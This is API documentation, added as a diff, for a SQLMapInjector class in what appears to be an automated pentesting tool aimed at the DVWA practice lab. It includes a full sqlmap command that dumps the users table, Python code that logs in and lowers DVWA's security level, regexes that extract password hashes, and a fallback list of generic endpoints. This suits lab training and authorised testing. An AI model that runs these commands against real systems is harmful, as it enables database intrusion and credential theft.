@@ -1,0 +1,290 @@
+---
+title: "SQLMapInjector"
+description: "SQL injection testing and credential extraction using SQLMap"
+---
+
+## Class Definition
+
+```python
+class SQLMapInjector:
+    def __init__(self, host: Host)
+```
+
+Automated SQL injection testing tool that targets DVWA and generic endpoints, extracts credentials from databases, and identifies SQL injection vulnerabilities.
+
+## Constructor
+
+### `__init__(host)`
+
+Initializes the SQLMapInjector with a target host.
+
+<ParamField path="host" type="Host" required>
+  Host object containing IP address and open ports information
+</ParamField>
+
+**Attributes:**
+- `host` (Host): Target host instance
+- `sql_dir` (Path): Output directory for SQLMap results (`{Config.OUTPUT_BASE}/sqlmap`)
+
+**Example:**
+```python
+injector = SQLMapInjector(host)
+```
+
+---
+
+## Public Methods
+
+### `attack()`
+
+Performs SQL injection attacks against HTTP services on the target host.
+
+```python
+def attack(self) -> list[Vulnerability]
+```
+
+**Attack Strategy:**
+1. Attempts DVWA-specific SQL injection with authentication
+2. Dumps `users` table from DVWA database
+3. Falls back to generic endpoint testing if DVWA fails
+4. Extracts and cracks credential hashes
+
+<ResponseField name="return" type="list[Vulnerability]">
+  List of SQL injection vulnerabilities discovered, with risk level CRITICAL
+</ResponseField>
+
+**Example:**
+```python
+vulns = injector.attack()
+for vuln in vulns:
+    print(f"{vuln.name} on port {vuln.port}")
+    print(f"Evidence: {vuln.evidence_file}")
+```
+
+**SQLMap Command (DVWA):**
+```bash
+sqlmap -u "http://192.168.56.101:80/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie "PHPSESSID=abc123; security=low" \
+  --batch --risk=2 --level=2 \
+  -D dvwa -T users -C user,password \
+  --dump --dump-format=CSV \
+  --threads=3
+```
+
+**Vulnerability Details:**
+```python
+Vulnerability(
+    name="💉 SQL INJECTION + DUMP CREDENCIALES",
+    description="SQLi en DVWA: http://target/dvwa/... → Volcado tabla users",
+    port=80,
+    risk=RiskLevel.CRITICAL,
+    evidence_file="/output/sqlmap/sql_192.168.56.101_80",
+    recommendations="Usar prepared statements, validar inputs, WAF"
+)
+```
+
+---
+
+## Private Methods
+
+### `_get_dvwa_cookie()`
+
+Authenticates to DVWA and retrieves session cookie.
+
+```python
+def _get_dvwa_cookie(self) -> str | None
+```
+
+**Authentication Flow:**
+1. GET login page to extract CSRF token (`user_token`)
+2. POST credentials with token
+3. Set security level to "low"
+4. Return combined cookie string
+
+<ResponseField name="return" type="str | None">
+  Cookie string formatted as `"PHPSESSID=xxx; security=low"` or None if login fails
+</ResponseField>
+
+**Implementation:**
+```python
+session = requests.Session()
+login_url = f"http://{self.host.ip}{Config.DVWA_LOGIN_URL}"
+
+# Extract CSRF token
+resp = session.get(login_url, timeout=10)
+token_match = re.search(r"user_token'\s+value='([^']+)'", resp.text)
+token = token_match.group(1) if token_match else ''
+
+# Login
+data = {
+    'username': Config.DVWA_DEFAULT_USER,
+    'password': Config.DVWA_DEFAULT_PASS,
+    'Login': 'Login',
+    'user_token': token
+}
+session.post(login_url, data=data, timeout=10)
+
+# Set security to low
+session.post(f"http://{self.host.ip}/dvwa/security.php",
+             data={'security': 'low', 'seclev_submit': 'Submit'},
+             timeout=10)
+
+cookies = session.cookies.get_dict()
+cookie_str = '; '.join([f"{k}={v}" for k, v in cookies.items()])
+return cookie_str + '; security=low'
+```
+
+---
+
+### `_find_all_credentials(output_dir, full_output)`
+
+Extracts credentials from SQLMap output files and console output.
+
+```python
+def _find_all_credentials(self, output_dir: Path, full_output: str) -> list[dict]
+```
+
+<ParamField path="output_dir" type="Path" required>
+  Directory containing SQLMap dump files and CSV exports
+</ParamField>
+
+<ParamField path="full_output" type="str" required>
+  Complete stdout/stderr from SQLMap execution
+</ParamField>
+
+<ResponseField name="return" type="list[dict]">
+  List of credential dictionaries with keys:
+  - `source` (str): "SQLMap (DVWA)"
+  - `user` (str): Username extracted
+  - `password` (str): MD5 hash or plaintext password
+  - `hash` (str): MD5 hash value
+  - `cracked` (bool): False (to be cracked later)
+</ResponseField>
+
+**Extraction Strategy:**
+
+**1. CSV Dump Files**
+```python
+for root, dirs, files in os.walk(str(output_dir)):
+    for fname in files:
+        if fname.endswith('.csv') or 'dump' in root.lower():
+            # Parse CSV format: user,hash or "user","hash"
+            md5_matches = re.findall(r'([a-fA-F0-9]{32})', line)
+            # Extract username from same line
+```
+
+**2. Console Output Tables**
+```python
+# Format: | id | user | hash |
+table_rows = re.findall(
+    r'\|[^|]*\|[^|]*?(\b\w{3,20}\b)[^|]*\|[^|]*?([a-fA-F0-9]{32})[^|]*\|',
+    full_output
+)
+```
+
+**3. Inline Format**
+```python
+# Format: username followed by hash on same line
+for line in full_output.split('\n'):
+    if re.search(r'[a-fA-F0-9]{32}', line):
+        md5 = re.findall(r'([a-fA-F0-9]{32})', line)
+        words = re.findall(r'\b([a-zA-Z]\w{2,15})\b', line)
+```
+
+**Example Output:**
+```python
+[
+    {
+        'source': 'SQLMap (DVWA)',
+        'user': 'admin',
+        'password': '5f4dcc3b5aa765d61d8327deb882cf99',
+        'hash': '5f4dcc3b5aa765d61d8327deb882cf99',
+        'cracked': False
+    },
+    {
+        'source': 'SQLMap (DVWA)',
+        'user': 'gordonb',
+        'password': 'e99a18c428cb38d5f260853678922e03',
+        'hash': 'e99a18c428cb38d5f260853678922e03',
+        'cracked': False
+    }
+]
+```
+
+---
+
+## Attack Targets
+
+### DVWA SQL Injection
+
+**Target URL:**
+```python
+f"http://{host.ip}:{port}{Config.DVWA_SQLI_URL}?id=1&Submit=Submit"
+# Example: http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+```
+
+**Database Dump:**
+- Database: `dvwa`
+- Table: `users`
+- Columns: `user`, `password`
+- Format: CSV
+
+### Generic Endpoints
+
+Fallback endpoints from `Config.SQL_ENDPOINTS`:
+```python
+endpoints = [
+    '/login.php',
+    '/admin.php',
+    '/search.php',
+    '/product.php?id=1'
+]
+```
+
+---
+
+## Timeout Configuration
+
+- **DVWA Attack**: 300 seconds (5 minutes)
+- **Generic Endpoints**: 120 seconds (2 minutes per endpoint)
+
+---
+
+## Output Files
+
+**Directory Structure:**
+```
+{Config.OUTPUT_BASE}/sqlmap/
+├── sql_192.168.56.101_80/
+│   ├── sqlmap_full_output.txt       # Complete console output
+│   ├── 192.168.56.101/
+│   │   └── dump/
+│   │       └── dvwa/
+│   │           └── users.csv        # Dumped credentials
+│   └── log                          # SQLMap log file
+└── generic/
+    └── [endpoint-specific folders]
+```
+
+---
+
+## Dependencies
+
+- `subprocess`: SQLMap execution
+- `re`: Credential parsing
+- `os`: File system traversal
+- `requests`: DVWA authentication
+- `pathlib.Path`: File operations
+- `config.Config`: Configuration settings
+- `models.host.Host`: Host data model
+- `models.vuln.Vulnerability`, `RiskLevel`: Vulnerability tracking
+- `rich.print`: Console output
+
+---
+
+## Related
+
+- [Host Model](/api/models/host)
+- [Vulnerability Model](/api/models/vulnerability)
+- [HashCracker](/api/services/hash-cracker)
+- [Configuration](/api/config)
